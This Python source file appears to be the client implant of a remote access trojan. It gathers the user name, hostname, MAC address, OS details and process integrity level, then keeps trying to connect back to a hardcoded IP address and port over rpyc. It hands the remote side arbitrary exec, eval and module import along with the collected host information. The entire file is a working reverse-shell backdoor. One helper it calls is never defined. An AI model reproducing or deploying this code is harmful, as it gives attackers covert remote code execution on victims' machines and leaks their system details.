# -*- coding: utf-8 -*-

import platform
import uuid
import os
import rpyc
import ctypes
import locale
import sys
import json
import logging
import zlib
from ctypes import windll, WinError, create_unicode_buffer, byref, c_uint32, GetLastError
from rpyc.core.channel import Channel
from rpyc.core.stream import SocketStream
from rpyc.core.service import Service, ModuleNamespace
from rpyc.lib.compat import execute

logging.basicConfig(format="%(asctime)s [%(levelname)s] - %(filename)s: %(funcName)s - %(message)s", level=logging.DEBUG)

os_encoding = locale.getpreferredencoding() or "utf8"
namespace = None
infos = {}

REVERSE_SLAVE_CONF = dict(
    allow_all_attrs=True,
    allow_public_attrs=True,
    allow_pickle=True,
    allow_getattr=True,
    allow_setattr=True,
    allow_delattr=True,
    import_custom_exceptions=False,
    propagate_SystemExit_locally=True,
    propagate_KeyboardInterrupt_locally=True,
    instantiate_custom_exceptions=True,
    instantiate_oldstyle_exceptions=True,
)


def safe_obtain(proxy):
    """ safe version of rpyc's rpyc.utils.classic.obtain, without using pickle. """
    if type(proxy) in [list, str, bytes, dict, set, type(None)]:
        return proxy
    conn = object.__getattribute__(proxy, "____conn__")()
    return json.loads(
        zlib.decompress(
            conn.root.json_dumps(proxy, compressed=True)
        )
    ) # should prevent any code execution


def obtain(proxy):
    """ allows to convert netref types into python native types """
    return safe_obtain(proxy)


def get_integrity_level():
    '''from http://www.programcreek.com/python/example/3211/ctypes.c_long'''

    mapping = {
        0x0000: u'Untrusted',
        0x1000: u'Low',
        0x2000: u'Medium',
        0x2100: u'Medium high',
        0x3000: u'High',
        0x4000: u'System',
        0x5000: u'Protected process',
    }

    BOOL = ctypes.c_long
    DWORD = ctypes.c_ulong
    HANDLE = ctypes.c_void_p

    class SID_AND_ATTRIBUTES(ctypes.Structure):
        _fields_ = [
            ('Sid', ctypes.c_void_p),
            ('Attributes', DWORD),
        ]

    class TOKEN_MANDATORY_LABEL(ctypes.Structure):
        _fields_ = [
            ('Label', SID_AND_ATTRIBUTES),
        ]

    TOKEN_READ = DWORD(0x20008)
    TokenIntegrityLevel = ctypes.c_int(25)
    ERROR_INSUFFICIENT_BUFFER = 122

    ctypes.windll.kernel32.GetLastError.argtypes = ()
    ctypes.windll.kernel32.GetLastError.restype = DWORD
    ctypes.windll.kernel32.GetCurrentProcess.argtypes = ()
    ctypes.windll.kernel32.GetCurrentProcess.restype = ctypes.c_void_p
    ctypes.windll.advapi32.OpenProcessToken.argtypes = (
            HANDLE, DWORD, ctypes.POINTER(HANDLE))
    ctypes.windll.advapi32.OpenProcessToken.restype = BOOL
    ctypes.windll.advapi32.GetTokenInformation.argtypes = (
            HANDLE, ctypes.c_long, ctypes.c_void_p, DWORD, ctypes.POINTER(DWORD))
    ctypes.windll.advapi32.GetTokenInformation.restype = BOOL
    ctypes.windll.advapi32.GetSidSubAuthorityCount.argtypes = [ctypes.c_void_p]
    ctypes.windll.advapi32.GetSidSubAuthorityCount.restype = ctypes.POINTER(
            ctypes.c_ubyte)
    ctypes.windll.advapi32.GetSidSubAuthority.argtypes = (ctypes.c_void_p, DWORD)
    ctypes.windll.advapi32.GetSidSubAuthority.restype = ctypes.POINTER(DWORD)

    token = ctypes.c_void_p()
    proc_handle = ctypes.windll.kernel32.GetCurrentProcess()
    if not ctypes.windll.advapi32.OpenProcessToken(
            proc_handle,
            TOKEN_READ,
            ctypes.byref(token)):
        logging.error('Failed to get process token')
        return None

    if token.value == 0:
        logging.error('Got a NULL token')
        return None
    try:
        info_size = DWORD()
        if ctypes.windll.advapi32.GetTokenInformation(
                token,
                TokenIntegrityLevel,
                ctypes.c_void_p(),
                info_size,
                ctypes.byref(info_size)):
            logging.error('GetTokenInformation() failed expectation')
            return None

        if info_size.value == 0:
            logging.error('GetTokenInformation() returned size 0')
            return None

        if ctypes.windll.kernel32.GetLastError() != ERROR_INSUFFICIENT_BUFFER:
            logging.error(
                    'GetTokenInformation(): Unknown error: %d',
                    ctypes.windll.kernel32.GetLastError())
            return None

        token_info = TOKEN_MANDATORY_LABEL()
        ctypes.resize(token_info, info_size.value)
        if not ctypes.windll.advapi32.GetTokenInformation(
                token,
                TokenIntegrityLevel,
                ctypes.byref(token_info),
                info_size,
                ctypes.byref(info_size)):
            logging.error(
                    'GetTokenInformation(): Unknown error with buffer size %d: %d',
                    info_size.value,
                    ctypes.windll.kernel32.GetLastError())
            return None

        p_sid_size = ctypes.windll.advapi32.GetSidSubAuthorityCount(
                token_info.Label.Sid)
        res = ctypes.windll.advapi32.GetSidSubAuthority(
                token_info.Label.Sid, p_sid_size.contents.value - 1)
        value = res.contents.value
        return mapping.get(value) or u'0x%04x' % value

    finally:
        ctypes.windll.kernel32.CloseHandle(token)


def GetUserName():
    DWORD = c_uint32
    nSize = DWORD(0)
    windll.advapi32.GetUserNameW(None, byref(nSize))
    error = GetLastError()

    ERROR_INSUFFICIENT_BUFFER = 122
    if error != ERROR_INSUFFICIENT_BUFFER:
        raise WinError(error)

    lpBuffer = create_unicode_buffer('', nSize.value + 1)

    success = windll.advapi32.GetUserNameW(lpBuffer, byref(nSize))
    if not success:
        raise WinError()

    return lpBuffer.value


def get_uuid():
    user = None
    node = None
    plat = None
    release = None
    version = None
    machine = None
    macaddr = None
    pid = None
    proc_arch = None
    proc_path = sys.executable
    integrity_level = None

    try:
        user = GetUserName().encode("utf8")
    except Exception as e:
        user = str(e)

    try:
        node = platform.node().decode(
            encoding=os_encoding
        ).encode("utf8")
    except Exception:
        pass

    try:
        version = platform.platform()
    except Exception:
        pass

    try:
        plat = platform.system()
    except Exception:
        pass

    try:
        release = platform.release()
    except Exception:
        pass

    try:
        version = platform.version()
    except Exception:
        pass

    try:
        machine = platform.machine()
    except Exception:
        pass

    try:
        pid = os.getpid()
    except Exception:
        pass

    try:
        osname = os.name
    except Exception:
        pass

    try:
        proc_arch = platform.architecture()[0]
    except Exception:
        pass

    try:
        macaddr = uuid.getnode()
        macaddr = ':'.join(("%012X" % macaddr)[i:i + 2] for i in range(0, 12, 2))
    except Exception:
        pass

    try:
        integrity_level = get_integrity_level()
    except Exception as e:
        integrity_level = "?"

    return {
        'user': user,
        'hostname': node,
        'platform': plat,
        'release': release,
        'version': version,
        'os_arch': machine,
        'os_name': osname,
        'macaddr': macaddr,
        'pid': pid,
        'proc_arch': proc_arch,
        'exec_path': proc_path,
        'intgty_lvl': integrity_level
    }


class STChannel(Channel):
    COMPRESSION_LEVEL = 6


class UpdatableModuleNamespace(ModuleNamespace):
    __slots__ = ['__invalidate__']

    def __invalidate__(self, name):
        cache = self._ModuleNamespace__cache
        if name in cache:
            del cache[name]


class ReverseSlaveService(Service):

    __slots__ = ["exposed_namespace", "exposed_cleanups"]

    def on_connect(self):
        self.exposed_namespace = {}
        self.exposed_cleanups = []
        self._conn._config.update(REVERSE_SLAVE_CONF)

        global infos
        if not infos:
            infos = get_uuid()

        namespace = UpdatableModuleNamespace(self.exposed_getmodule)
        self._conn.root.set_modules(namespace)

    def on_disconnect(self):
        for cleanup in self.exposed_cleanups:
            try:
                cleanup()
            except Exception as e:
                print_exception('[D]')

        self.exposed_cleanups = []

        try:
            self._conn.close()
        except Exception as e:
            print "Error closing connection:", str(e)

    def exposed_exit(self):
        try:
            return True
        finally:
            sys.exit(0)

    def exposed_get_infos(self, s=None):
        global infos

        if not s:
            return {
                k: v for k, v in infos.iteritems()
            }

        if s not in infos:
            return None

        return infos[s]

    def exposed_register_cleanup(self, method):
        self.exposed_cleanups.append(method)

    def exposed_unregister_cleanup(self, method):
        self.exposed_cleanups.remove(method)

    def exposed_execute(self, text):
        """execute arbitrary code (using ``exec``)"""
        execute(text, self.exposed_namespace)

    def exposed_eval(self, text):
        """evaluate arbitrary code (using ``eval``)"""
        return eval(text, self.exposed_namespace)

    def exposed_getmodule(self, name):
        """imports an arbitrary module"""
        return __import__(name, None, None, "*")

    def exposed_json_dumps(self, obj, compressed=False):
        try:
            data = json.dumps(obj, ensure_ascii=False)
        except:
            try:
                data = json.dumps(
                    obj,
                    ensure_ascii=False,
                    encoding=locale.getpreferredencoding()
                )
            except:
                data = json.dumps(
                    obj,
                    ensure_ascii=False,
                    encoding='latin1'
                )

        if compressed:
            if type(data) == unicode:
                data = data.encode('utf-8')

            data = zlib.compress(data)

        return data

    def exposed_getconn(self):
        """returns the local connection instance to the other side"""
        return self._conn


while True:
    try:
        s = SocketStream.connect("172.16.164.1", 18861, ipv6=False, keepalive=True)
        conn = rpyc.connect_channel(STChannel(s), service=ReverseSlaveService)
        break
    except Exception as e:
        pass

bgsrv = rpyc.BgServingThread(conn)
bgsrv._thread.join()
